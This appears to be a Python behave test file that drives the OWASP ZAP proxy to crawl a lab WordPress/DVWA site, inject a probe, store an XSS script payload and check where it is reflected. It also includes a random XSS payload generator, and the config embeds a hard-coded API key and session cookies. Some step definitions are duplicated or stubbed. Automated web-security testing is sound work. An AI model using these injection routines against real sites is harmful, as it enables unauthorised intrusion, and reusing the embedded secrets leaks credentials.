from zapv2 import ZAPv2
from behave import Given, When, Then
import selenium
import time
import re
import random
import requests
import urllib.parse
from fuzzywuzzy import fuzz
from zapop import *
from webop import *
from selenium.webdriver.common.by import By

# config
target = ''
data = {}
apikey = '9kk6ihe98mhh07bd5pj39r8bb'
cookie = "PHPSESSID=8p5v0b8kc5ugkt4njognv7lg03; security=low; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_ef301f25d1b8e2bca70fafc1316f1a92=user1%7C1681022282%7CnOjoU7EJdIvMKePKKJJZfBg4r0YuuHfdCj6gRLoiZoK%7C52285f6f24922ab73248a55694fd1803722ee70045b9fe08cd5de9e49ec98761"


@Given("初始化")
def init(context):
    zap = ZAPv2(apikey=apikey)
    context.zap = zap


@Given("使用爬虫爬取{url}")
def use_spider_visit(context,url):
    assert context.zap != None
    scanid = context.zap.spider.scan(url)
    status = context.zap.spider.status(scanid)
    time.sleep(2)
    while (int(status) < 100):
        status = int(context.zap.spider.status(scanid))
        time.sleep(2)
    context.spiderid = scanid

@Given('使用代理工具访问{url}')
def proxy_visit(context, url):
    context.visit_url = url
    res = context.zap.urlopen(url)
    context.visit_res = res




@Given("使用代理工具")
def use_proxy_visit(context):
    assert context.zap != None
    context.zap.urlopen(target)


@Given("浏览{target}")
def use_hand_visit(context, target):
    assert context.zap != None
    context.webdriver = createDriver()
    context.target = target


@Given("确定攻击点{param}")
def set_point(context, param):
    context.param = param


@When("使用XSS探针")
def xss_probe(context):
    xss_probe = 'v3dm0s'
    # request在哪注入探针
    request = get_request_byurl(context.zap, 'http://192.168.0.101/wp-json/wp/v2/posts/1?_locale=user', 1830)
    request = set_param(request, context.param, xss_probe)
    response = context.zap.core.send_request(request)
    # 检查探针是否存储
    context.probecheck = check_probe(xss_probe, response)


@When("存储恶意XSS")
def xss_injection(context):
    payload = '<script>alert(\'123\')</script>'
    request = get_request_byurl(context.zap, context.target)
    request = set_param(request, context.param, payload)
    context.attackres = send_request(context.zap, request)
    context.xsspayload = payload


@Then("查看存储内容{resulturl}")
def check_xss(context, resulturl):
    if resulturl == None:
        response = context.attackres
    else:
        response = context.zap.urlopen(resulturl)
    assert xsschecker(response, context.xsspayload) == True


def make_injection(payload, dataname):
    data[dataname] = payload
    request_to_string(target, data)


def make_request(param, value):
    data[param] = value
    request_to_string(target, data)


def xss_payload_generate():
    U1 = ['\'>', '\">', '<\"', '']
    U2 = ['<img src=\'abc\' ...>', '<iframe src=# ...>', '<iframe src=\'xxx\' ...>', '<script>...</script>']
    U3 = ['onload=\"...\"', 'onmouseover=\"...\"', 'onerror=\"...\"', '...']
    U4 = ['alert("XSS")', 'javascript:alert(\'XSS\')', 'alert("document.cookie")']
    random_index = random.randrange(len(U1))
    str = U1[random_index]
    random_index = random.randrange(len(U2))
    str += U2[random_index]
    random_index = random.randrange(len(U3))
    str = str.replace('...', U3[random_index])
    random_index = random.randrange(len(U4))
    str = str.replace('...', U4[random_index])
    return str


def extractScripts(probe, response):
    scripts = []
    matches = re.findall(r'(?s)<script.*?>(.*?)</script>', response.lower())
    for match in matches:
        if probe in match:
            scripts.append(match)
    return scripts


def escaped(position, string):
    usable = string[:position][::-1]
    match = re.search(r'^\\*', usable)
    if match:
        match = match.group()
        if len(match) == 1:
            return True
        elif len(match) % 2 == 0:
            return False
        else:
            return True
    else:
        return False


def isBadContext(position, non_executable_contexts):
    badContext = ''
    for each in non_executable_contexts:
        if each[0] < position < each[1]:
            badContext = each[2]
            break
    return badContext


def check_probe(probe, response):
    rawResponse = response
    response = response.text  # response content

    reflections = response.count(probe)  # 数一下探针出现个数
    position_and_context = {}
    environment_details = {}
    clean_response = re.sub(r'<!--[.\s\S]*?-->', '', response)  # 消除注释
    script_checkable = clean_response

    for script in extractScripts(probe, script_checkable):  # 找探针注入点
        occurences = re.finditer(r'(%s.*?)$' % probe, script)
        if occurences:
            for occurence in occurences:
                thisPosition = occurence.start(1)  # 在脚本中的起始位置
                position_and_context[thisPosition] = 'script'
                environment_details[thisPosition] = {}
                environment_details[thisPosition]['details'] = {'quote': ''}
                for i in range(len(occurence.group())):  # 判断xss能否逃逸
                    currentChar = occurence.group()[i]
                    if currentChar in ('/', '\'', '`', '"') and not escaped(i, occurence.group()):
                        environment_details[thisPosition]['details']['quote'] = currentChar
                    elif currentChar in (')', ']', '}', '}') and not escaped(i, occurence.group()):
                        break
                script_checkable = script_checkable.replace(probe, '', 1)  # 把探针替换为空

    if len(position_and_context) < reflections:  # 探针在<>中
        attribute_context = re.finditer(r'<[^>]*?(%s)[^>]*?>' % probe, clean_response)
        for occurence in attribute_context:
            match = occurence.group(0)
            thisPosition = occurence.start(1)
            parts = re.split(r'\s', match)
            tag = parts[0][1:]
            for part in parts:
                if probe in part:
                    Type, quote, name, value = '', '', '', ''
                    if '=' in part:
                        quote = re.search(r'=([\'`"])?', part).group(1)
                        name_and_value = part.split('=')[0], '='.join(part.split('=')[1:])
                        if probe == name_and_value[0]:
                            Type = 'name'
                        else:
                            Type = 'value'
                        name = name_and_value[0]
                        value = name_and_value[1].rstrip('>').rstrip(quote).lstrip(quote)
                    else:
                        Type = 'flag'
                    position_and_context[thisPosition] = 'attribute'
                    environment_details[thisPosition] = {}
                    environment_details[thisPosition]['details'] = {'tag': tag, 'type': Type, 'quote': quote,
                                                                    'value': value, 'name': name}

    if len(position_and_context) < reflections:  # 探针在html中
        html_context = re.finditer(probe, clean_response)
        for occurence in html_context:
            thisPosition = occurence.start()
            if thisPosition not in position_and_context:
                position_and_context[occurence.start()] = 'html'
                environment_details[thisPosition] = {}
                environment_details[thisPosition]['details'] = {}

    if len(position_and_context) < reflections:  # 探针在注释中
        comment_context = re.finditer(r'<!--[\s\S]*?(%s)[\s\S]*?-->' % probe, response)
        for occurence in comment_context:
            thisPosition = occurence.start(1)
            position_and_context[thisPosition] = 'comment'
            environment_details[thisPosition] = {}
            environment_details[thisPosition]['details'] = {}
    # 返回探针位置以及情况
    database = {}
    for i in sorted(position_and_context):
        database[i] = {}
        database[i]['position'] = i
        database[i]['context'] = position_and_context[i]
        database[i]['details'] = environment_details[i]['details']
    # 不可执行的内容
    bad_contexts = re.finditer(
        r'(?s)(?i)<(style|template|textarea|title|noembed|noscript)>[.\s\S]*(%s)[.\s\S]*</\1>' % probe, response)
    non_executable_contexts = []
    for each in bad_contexts:
        non_executable_contexts.append([each.start(), each.end(), each.group(1)])

    if non_executable_contexts:
        for key in database.keys():
            position = database[key]['position']
            badTag = isBadContext(position, non_executable_contexts)
            if badTag:
                database[key]['details']['badTag'] = badTag
            else:
                database[key]['details']['badTag'] = ''
    return database


def fillHoles(original, new):
    filler = 0
    filled = []
    for x, y in zip(original, new):
        if int(x) == (y + filler):
            filled.append(y)
        else:
            filled.extend([0, y])
            filler += (int(x) - y)
    return filled


def xsschecker(response, payload, positions=None):
    response = response.text
    encoding = None
    # checkString = 'st4r7s' + payload + '3nd'
    checkString = payload
    reflectedPositions = []
    print(payload)
    for match in re.finditer('st4r7s', response):
        reflectedPositions.append(match.start())
    filledPositions = fillHoles(positions, reflectedPositions)
    num = 0
    efficiencies = []
    for position in filledPositions:
        allEfficiencies = []
        try:
            reflected = response[reflectedPositions[num]
                                 :reflectedPositions[num] + len(checkString)]
            efficiency = fuzz.partial_ratio(reflected, checkString.lower())  # 相似度匹配
            allEfficiencies.append(efficiency)
        except IndexError:
            pass
        if position:
            reflected = response[position:position + len(checkString)]
            efficiency = fuzz.partial_ratio(reflected, checkString)
            if reflected[:-2] == ('\\%s' % checkString.replace('st4r7s', '').replace('3nd', '')):
                efficiency = 90
            allEfficiencies.append(efficiency)
            efficiencies.append(max(allEfficiencies))
        else:
            efficiencies.append(0)
        num += 1
    efficiencies = list(filter(None, efficiencies))
    bestEfficiency = max(efficiencies)
    if bestEfficiency == 100:
        return True
    return False


def request_to_string(target, data=None):
    if data == None:
        method = 'GET'
    else:
        method = 'POST'
    http = 'HTTP/1.1'
    connection = 'keep-alive'
    Accept = '*/*'
    User_Agent = "Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr"
    cookie = "wordpress_test_cookie=WP+Cookie+check"
    Host = urllib.parse.urlparse(target).hostname

    request = method + ' ' + target + ' ' + http + '\n' + 'Host: ' + Host + '\n' + 'User-Agent: ' + User_Agent + '\n' + 'Cookie: ' + cookie + '\n' \
              + 'Connection: ' + connection
    if data != None:
        request = request + '\r\n' + '\r\n' + data
    return request
def assertIsTrue( value):
    return True

def xss_probe_parse(xss_probe, param, res):
    return 1


@Given('登录')
def login(context):
    pass


@Given('使用代理工具访问{url}')
def proxy_visit(context, url):
    context.target = url
    context.zap.urlopen(url)
    context.visit = get_request_byurl(url)


@When('使用XSS探针在字段{param}处提交')
def xss_probe(context, param):
    xssprobe = 'v3dm0s'
    request = get_request_byurl(context.zap, context.target, param)
    res = xss_probe_parse(xssprobe, param, request)
    context.probe_res = check_probe(xssprobe, res)


@When('添加字段{param}')
def add_param(context, param):
    params = parse_param(param)
    context.extra_param = params


@When('在{param}处存储{input}')
def xss_store(context, param, input):
    request = get_request_byurl(context.zap, context.target)
    request = set_param(request, param, input, context.extra_param)
    context.res = xss_injection(context.zap, request)
    context.input = input


@Then('查看{url}XSS注入结果')
def check_xss_res(context, url):
    if url is None:
        response = context.res
    else:
        response = context.zap.urlopen(url)
    result = xsschecker(response, context.input)
    assertIsTrue(result)

@Given('使用爬虫访问{url}')
def test1():
    pass
@When('使用代理工具注入{input}')
def test2():
    pass
@Then('寻找{url}恶意结果')
def test3():
    pass
def parse_param(param):
    ok = param
    return ok
@Then('查看{string}处注入结果')
def tt(context,string):
    pass